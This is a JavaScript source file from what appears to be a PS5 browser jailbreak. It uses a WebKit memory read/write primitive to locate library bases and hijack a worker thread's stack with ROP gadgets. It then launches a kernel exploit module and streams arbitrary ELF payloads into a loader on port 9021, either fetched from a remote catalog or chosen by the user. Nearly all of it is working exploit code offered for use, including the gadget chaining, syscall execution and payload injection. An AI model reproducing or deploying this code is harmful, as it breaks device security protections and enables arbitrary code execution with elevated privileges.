function countFingerprints(p, stack, expected) {
  let count = 0;
  for (let offset = 0x7f000; offset < 0x80000; offset += 0x8) {
    const v = p.read8(stack.add32(offset));
    if (v.low === expected.low && v.hi === expected.hi) count++;
  }
  return count;
}

async function findWorkerStack(p, libKernelBase) {
  const PTHREAD_NEXT_THREAD_OFFSET = 0x38;
  const PTHREAD_STACK_ADDR_OFFSET = 0xa8;
  const PTHREAD_STACK_SIZE_OFFSET = 0xb0;

  const plausible = (a) =>
    a.hi >= 0 && a.hi < 0x8000 && a.low >= 0x10000 && (a.low & 0x7) === 0;

  const head = libKernelBase.add32(OFFSET_lk__thread_list);

  // Collect every plausibility-gated 0x80000 stack.
  const stacks = [];
  let steps = 0;
  for (
    let thread = p.read8(head);
    thread.low != 0x0 && thread.hi != 0x0 && steps++ < 512;
  ) {
    if (!plausible(thread)) break;

    const next = p.read8(thread.add32(PTHREAD_NEXT_THREAD_OFFSET));
    const stack = p.read8(thread.add32(PTHREAD_STACK_ADDR_OFFSET));
    const stacksz = p.read8(thread.add32(PTHREAD_STACK_SIZE_OFFSET));
    if (stacksz.hi === 0 && stacksz.low === 0x80000 && plausible(stack))
      stacks.push(stack);
    thread = next;
  }
  if (stacks.length === 0)
    throw new Error(`failed to find worker. (libkernel thread_list @ 0x${head.toString()}; scanned ${steps} thread nodes)`);

  // fingerprint-select. The rop_slave thread parks in the libkernel
  const expected = libKernelBase.add32(OFFSET_lk_worker_wait_return);
  for (let attempt = 0; attempt < 50; attempt++) {
    const hits = stacks.filter((stack) =>
      countFingerprints(p, stack, expected) > 0,
    );
    if (hits.length === 1) return hits[0];
    if (hits.length === 0) {
      await new Promise((resolve) => setTimeout(resolve, 1));
      continue;
    }
    throw new Error(`worker-stack signature ambiguous: ${hits.length}/${stacks.length} plausible 0x80000 stacks are parked at kbase+${(OFFSET_lk_worker_wait_return >>> 0).toString(16)}`);
  }
  throw new Error(`no plausible 0x80000 stack parked at kbase+${(OFFSET_lk_worker_wait_return >>> 0).toString(16)} after retries (${stacks.length} candidates scanned)`);
}

async function findWorkerReturnSlot(p, stack, libKernelBase) {
  const expected = libKernelBase.add32(OFFSET_lk_worker_wait_return);
  let lastCount = 0;

  for (let attempt = 0; attempt < 50; attempt++) {
    let hit = null;
    let count = 0;
    for (let offset = 0x7f000; offset < 0x80000; offset += 0x8) {
      const candidate = stack.add32(offset);
      const value = p.read8(candidate);
      if (value.low !== expected.low || value.hi !== expected.hi) continue;

      hit = candidate;
      count++;
    }
    if (count === 1) {
      return hit;
    }
    lastCount = count;
    await new Promise((resolve) => setTimeout(resolve, 1));
  }
  throw new Error(`worker wait return fingerprint count ${lastCount}, expected 1`);
}

function log(message, type = "log") {
  window.writeLog(message, type);
}

const ROP_WAIT_MS = 20000;

function jbmark(tag, detail) {
  try {
    if (window.jb && typeof window.jb.mark === "function")
      window.jb.mark(tag, String(detail));
  } catch (e) {}
}

async function prepareRop(p) {
  const ctor = globalThis.__ps5NativeCtor;
  let webkitBase;
  if (typeof ctor === "number" && typeof OFFSET_wk_host_constructor_candidates !== "undefined") {
    for (const offset of OFFSET_wk_host_constructor_candidates) {
      const candidate = ctor - offset;
      if (candidate >= 0x800000000 && candidate < 0x900000000 && candidate % 0x4000 === 0) {
        webkitBase = candidate;
        break;
      }
    }
  }
  if (webkitBase === undefined)
    throw new Error("no host-constructor candidate gave a valid base (ctor=0x" + String(ctor) + ")");
  const libSceNKWebKitBase = new int64(webkitBase % 0x100000000,
    Math.floor(webkitBase / 0x100000000));

  let libSceLibcInternalBase = p.read8(
    libSceNKWebKitBase.add32(OFFSET_wk_memset_import),
  );
  libSceLibcInternalBase.sub32inplace(OFFSET_lc_memset);

  let libKernelBase = p.read8(
    libSceNKWebKitBase.add32(OFFSET_wk___stack_chk_guard_import),
  );
  libKernelBase.sub32inplace(OFFSET_lk___stack_chk_guard);

  const gadgets = {};
  const syscalls = {};

  for (const gadget in wk_gadgetmap) {
    gadgets[gadget] = libSceNKWebKitBase.add32(wk_gadgetmap[gadget]);
  }
  for (const sysc in syscall_map) {
    syscalls[sysc] = libKernelBase.add32(syscall_map[sysc]);
  }

  const allocations = [];

  function malloc(size, type = 4) {
    const backing =
      type === 1
        ? new Uint8Array(1000 + size)
        : new Uint32Array(0x10000 + size);
    allocations.push(backing);

    const ptr = p.read8(p.leakval(backing).add32(0x10));
    ptr.backing = backing;
    return ptr;
  }

  function stringify(str) {
    const bufView = new Uint8Array(str.length + 1);
    for (let i = 0; i < str.length; i++) {
      bufView[i] = str.charCodeAt(i) & 0xff;
    }

    const ptr = p.read8(p.leakval(bufView).add32(0x10));
    ptr.backing = bufView;
    return ptr;
  }

  function writestr(addr, str) {
    let waddr = addr.add32(0);
    if (typeof str == "string") {
      for (let i = 0; i < str.length; i++) {
        let byte = str.charCodeAt(i);
        if (byte == 0) {
          break;
        }
        p.write1(waddr, byte);
        waddr.add32inplace(0x1);
      }
    }
    p.write1(waddr, 0x0);
  }

  const worker = new Worker("./src/utils/rop_slave.js");

  async function waitForWorker() {
    return new Promise((resolve, reject) => {
      worker.onmessage = () => resolve();
      worker.onerror = () => reject(new Error("Worker failed to load"));
      worker.postMessage(0);
    });
  }

  jbmark("Worker", "waiting");
  await waitForWorker();
  jbmark("Worker", "ready");

  const workerStack = await findWorkerStack(p, libKernelBase);
  const originalContext = malloc(0x40);

  const returnAddress = await findWorkerReturnSlot(p, workerStack, libKernelBase);
  const originalReturnAddress = p.read8(returnAddress);
  const stackPointerSlot = returnAddress.add32(0x8);

  function prepareChain(chain) {
    chain.push(gadgets["pop rdi"]);
    chain.push(originalContext);
    chain.push(libSceLibcInternalBase.add32(OFFSET_lc_setjmp));
  }

  async function launchChain(chain) {
    const originalStackPointer = p.read8(stackPointerSlot);
    chain.push_write8(originalContext, originalReturnAddress);
    chain.push_write8(originalContext.add32(0x10), returnAddress);
    chain.push_write8(stackPointerSlot, originalStackPointer);
    chain.push(gadgets["pop rdi"]);
    chain.push(originalContext);
    chain.push(libSceLibcInternalBase.add32(OFFSET_lc_longjmp));

    p.write8(returnAddress, gadgets["pop rsp"]);
    p.write8(stackPointerSlot, chain.stack_entry_point);

    const completed = await new Promise((resolve) => {
      let settled = false;
      const finish = (value) => {
        if (settled) return;
        settled = true;
        resolve(value);
      };
      worker.onmessage = () => finish(true);
      setTimeout(() => finish(false), ROP_WAIT_MS);
      worker.postMessage(0);
    });

    if (!completed)
      throw new Error(`the rop worker never answered in ${ROP_WAIT_MS / 1000}s - refusing to continue on a chain that never ran. (Reload.)`);
  }

  const runtime = {
    write8: p.write8,
    write4: p.write4,
    write2: p.write2,
    write1: p.write1,
    read8: p.read8,
    read4: p.read4,
    read2: p.read2,
    read1: p.read1,
    leakval: p.leakval,
    pre_chain: prepareChain,
    launch_chain: launchChain,
    malloc,
    stringify,
    writestr,
    libSceLibcInternalBase,
    libKernelBase,
    syscalls,
    gadgets,
  };

  const chain = new worker_rop(runtime);

  const JB_POISON = new int64(0xdeadbeef, 0x00c0ffee);
  p.write8(chain.return_value, JB_POISON);
  const pid = await chain.syscall(SYS_GETPID);
  if (pid.low == JB_POISON.low && pid.hi == JB_POISON.hi) {
    throw new Error("Worker chain did not execute; the return slot is unchanged.");
  }

  if (pid.low == 0) {
    throw new Error("WebKit exploit failed.");
  }
  jbmark("Worker chain", "ready");

  return { p: runtime, chain };
}

/* ------------------------------------------------------------------
 * Delivery: pldmgr default + the built-in payload manager.
 *
 * Ordering is strict: runKernelExploit above runs the kernel exploit FIRST,
 * its kernel loader starts elfldr on 127.0.0.1:9021, and only then does
 * anything below hand payloads over - via the direct socket injection in
 * src/inject.js, which streams the raw ELF into the loader exactly like the
 * documented `nc -q0 <ps5> 9021 < payload.elf` does, using ROP syscalls in
 * this now-root, sandbox-escaped process. No browser-HTTP hand-over (the
 * loader's `GET /?uri=` answers with HTTP 200 headers instantly, and https
 * pages block http://127.0.0.1 as mixed content anyway).
 *
 * Two delivery sources share that one path:
 *   - the default action still injects pldmgr (dashboard on port 8084);
 *   - the payload manager UI (src/ui.js) sends any evoX-CoreOS catalog
 *     payload - or a custom .elf the user picked - the same way, any time
 *     while this page stays open.
 *
 * Every post-exploit ROP launch goes through one serialized chain: the rop
 * worker executes one chain at a time, so concurrent deliveries (and their
 * stdout drains) queue up instead of interleaving inside the worker.
 * ------------------------------------------------------------------ */
const PLDMGR_META = { name: "pldmgr", version: "0.6.3", file: "payloads/pldmgr_v0.6.3.elf" };

function payloadUrl() {
  return new URL(PLDMGR_META.file, location.href).href;
}

/* Wrap the rop chain so every syscall/call runs one at a time. */
function makeSerializedChain(chain) {
  let queue = Promise.resolve();
  function wrap(method) {
    const bound = chain[method].bind(chain);
    return function (...args) {
      const run = queue.then(() => bound(...args));
      queue = run.then(() => {}, () => {});
      return run;
    };
  }
  return { syscall: wrap("syscall"), call: wrap("call") };
}

/* Download a catalog payload with progress lines for anything sizeable.
 * XHR (not fetch) so onprogress works on every PS5 webkit build. */
function fetchWithProgress(url, say, label) {
  return new Promise((resolve, reject) => {
    const xhr = new XMLHttpRequest();
    xhr.open("GET", url, true);
    xhr.responseType = "arraybuffer";
    xhr.timeout = 600000;
    let lastPct = -1;
    xhr.onprogress = function (event) {
      if (!event.lengthComputable || !event.total || event.total < 4 * 1024 * 1024)
        return;
      const pct = Math.floor((event.loaded / event.total) * 100);
      if (pct !== lastPct && pct % 10 === 0) {
        lastPct = pct;
        say(label + ": " + pct + "% (" +
            (event.loaded / 1048576).toFixed(1) + " / " +
            (event.total / 1048576).toFixed(1) + " MB)", "info");
      }
    };
    xhr.onload = function () {
      if (xhr.status === 200 || xhr.status === 304)
        resolve(new Uint8Array(xhr.response));
      else
        reject(new Error("HTTP " + xhr.status + " for " + url));
    };
    xhr.onerror = function () { reject(new Error("network error for " + url)); };
    xhr.ontimeout = function () { reject(new Error("download timed out")); };
    xhr.send();
  });
}

async function sha256Hex(bytes) {
  if (!window.crypto || !window.crypto.subtle || !window.crypto.subtle.digest)
    return null;
  try {
    const digest = await window.crypto.subtle.digest("SHA-256", bytes);
    return Array.from(new Uint8Array(digest))
      .map((b) => b.toString(16).padStart(2, "0")).join("");
  } catch (e) { return null; }
}

function isElfBytes(bytes) {
  return bytes && bytes.length > 0x40 &&
    bytes[0] === 0x7f && bytes[1] === 0x45 && bytes[2] === 0x4c && bytes[3] === 0x46;
}

/* Send one evoX-CoreOS catalog payload: download (CORS is open on the
 * evoX host), verify ELF magic + sha256, stream into elfldr, then mirror
 * its first stdout lines so the payload itself confirms it is alive. */
async function deliverCatalogPayload(p, chain, inject, entry, log) {
  log("downloading " + entry.name + " (" + (entry.version || "") + ") from evoX-CoreOS...", "info");
  const bytes = await fetchWithProgress(entry.url, log, entry.name);
  if (!isElfBytes(bytes))
    throw new Error(entry.name + " is not an ELF payload");

  if (entry.sha256) {
    const sha = await sha256Hex(bytes);
    if (sha && sha !== entry.sha256)
      throw new Error(entry.name + " failed its checksum - the download is corrupted");
    log(sha
      ? entry.name + " checksum verified (" + bytes.length + " bytes)"
      : entry.name + " checksum skipped (no crypto.subtle on plain http)", "info");
  }

  if (bytes.length > 16 * 1024 * 1024)
    log(entry.name + " is " + (bytes.length / 1048576).toFixed(1) +
        " MB - the socket transfer takes a moment", "info");

  const fd = await inject.injectPayloadBytes(p, chain, bytes, {
    name: entry.filename || "payload.elf",
    version: entry.version || "",
    loaderPort: 9021,
    say: log,
    onProgress: makeSocketProgressLogger(entry.name, log),
  });
  log(entry.name + " handed to the ELF loader (" + bytes.length + " bytes)", "success");
  await inject.drainPayloadStdout(p, chain, fd, entry.name, log, 15000);
}

/* Send a user-picked .elf (Custom tab): same socket path, bytes are local. */
async function deliverCustomBytes(p, chain, inject, name, bytes, log) {
  if (!isElfBytes(bytes))
    throw new Error(name + " is not an ELF payload (elfldr only takes .elf files)");
  const fd = await inject.injectPayloadBytes(p, chain, bytes, {
    name: name,
    loaderPort: 9021,
    say: log,
    onProgress: makeSocketProgressLogger(name, log),
  });
  log(name + " handed to the ELF loader (" + bytes.length + " bytes)", "success");
  await inject.drainPayloadStdout(p, chain, fd, name, log, 15000);
}

function makeSocketProgressLogger(label, log) {
  let announced = 0;
  return function (sent, total) {
    if (total >= 8 * 1024 * 1024 && sent - announced >= 8 * 1024 * 1024) {
      announced = sent;
      log(label + ": " + (sent / 1048576).toFixed(1) + " / " +
          (total / 1048576).toFixed(1) + " MB streamed to the loader", "info");
    }
  };
}

async function runQueuedDelivery(inject, p, chain, item) {
  const label = item.type === "custom" ? item.name : (item.entry && item.entry.name) || "payload";
  try {
    if (item.type === "custom")
      await deliverCustomBytes(p, chain, inject, item.name, item.bytes, log);
    else
      await deliverCatalogPayload(p, chain, inject, item.entry, log);
  } catch (e) {
    log(label + " delivery failed: " + (e && e.message ? e.message : e), "error");
  }
}

/* The default post-exploit action: pldmgr as its own process. */
async function deliverPldmgr(p, chain, inject) {
  const versions = window.PS5_PAYLOAD_ENTRIES || {};
  const meta = versions.pldmgr || PLDMGR_META;
  let delivered = false;
  let bytes = null;
  try {
    const cache = window.PS5PayloadCache;
    if (!cache || !cache.resolve)
      throw new Error("the payload cache is unavailable");
    bytes = await cache.resolve(meta, log);
    delivered = await inject.deliverViaLoader(p, chain, bytes, {
      name: meta.name || PLDMGR_META.name,
      version: meta.version || PLDMGR_META.version,
      loaderPort: 9021,
      dashboardPort: 8084,
      say: log,
    });
  } catch (e) {
    log("pldmgr delivery failed: " + (e && e.message ? e.message : e), "error");
  }

  if (delivered) {
    log("pldmgr v" + (meta.version || PLDMGR_META.version) +
        " is running as its own process (dashboard on port 8084)", "success");
    log("dashboard: http://<your-ps5-ip>:8084 - a PS5 notification shows the address", "info");
    log("elfldr keeps listening on port 9021 - any payload in the list can be sent on top", "info");
    return;
  }

  try {
    if (bytes) await inject.beaconHandover(payloadUrl(), log);
    inject.manualHandoverLink(payloadUrl(), meta.name || PLDMGR_META.name, log);
  } catch (e) { /* keep the log clean - the port probe already reported */ }
}

async function main(userlandRW) {
  const { p, chain } = await prepareRop(userlandRW);
  const { runKernelExploit } = await import("./relapse_exploit.js");
  const result = await runKernelExploit(p, chain, log);
  if (!result || !result.done)
    throw new Error("kernel exploit did not finish");

  if (!result.payloads) {
    log("kernel exploit stopped early - no payload was launched", "error");
    return;
  }

  const kexp = result.payloads;
  log("kernel exploit complete", "info");
  const versions = window.PS5_PAYLOAD_ENTRIES || {};
  if (kexp.elfldrOk) {
    log("elfldr v" + ((versions.elfldr || {}).version || "13.60") +
        " is up on port 9021", "success");
  } else {
    log("elfldr start did not confirm (" +
        (kexp.elfldrError && kexp.elfldrError.message ? kexp.elfldrError.message : "no answer") +
        ") - the hand-over below keeps retrying the port", "error");
  }

  const inject = await import("./inject.js");

  /* Hand the live session to the payload manager UI. Every ROP call after
   * the kernel exploit goes through one serialized chain, so deliveries
   * triggered from the UI can safely overlap running drains. */
  const safeChain = makeSerializedChain(chain);
  const session = window.RelapseSession;
  if (session) {
    session.p = p;
    session.chain = safeChain;
    session.state = "ready";
  }
  window.RelapseDeliver = {
    catalogPayload: (entry) =>
      runQueuedDelivery(inject, p, safeChain, { type: "catalog", entry: entry }),
    customPayload: (name, bytes) =>
      runQueuedDelivery(inject, p, safeChain, { type: "custom", name: name, bytes: bytes }),
    pldmgr: () =>
      deliverPldmgr(p, safeChain, inject).catch((e) =>
        log("pldmgr delivery failed: " + (e && e.message ? e.message : e), "error")),
  };
  if (window.RelapseUI) window.RelapseUI.setState("ready");
  log("payload manager unlocked - every payload below is one tap away", "success");

  /* If the user tapped payloads before (or while) the exploit ran, deliver
   * them now instead of the pldmgr default. */
  const queue = session ? session.pending.splice(0, session.pending.length) : [];
  if (queue.length > 0) {
    log(queue.length + " payload(s) queued - delivering now", "info");
    for (const item of queue) await runQueuedDelivery(inject, p, safeChain, item);
    return;
  }

  await deliverPldmgr(p, safeChain, inject);
}

/* offsets are loaded by site.js (cache-backed, deterministic ordering) */